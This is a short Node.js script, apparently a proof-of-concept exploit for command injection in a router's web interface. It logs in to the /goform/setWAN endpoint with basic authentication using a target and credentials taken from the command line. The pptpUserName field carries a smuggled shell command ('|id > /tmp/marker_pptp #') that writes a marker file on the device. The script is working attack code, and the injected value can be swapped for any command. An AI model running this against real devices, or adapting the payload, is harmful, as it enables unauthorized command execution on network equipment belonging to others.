const [target, user, password] = process.argv.slice(2);
const body = new URLSearchParams({
  wanMode: '3',
  pptpUserName: '|id > /tmp/marker_pptp #',
  'submit-url': '/wan.asp'
});
fetch(target.replace(/\/$/, '') + '/goform/setWAN', {
  method: 'POST',
  headers: {Authorization: 'Basic ' + Buffer.from(user + ':' + password).toString('base64')},
  body
}).then(response => console.log(response.status));
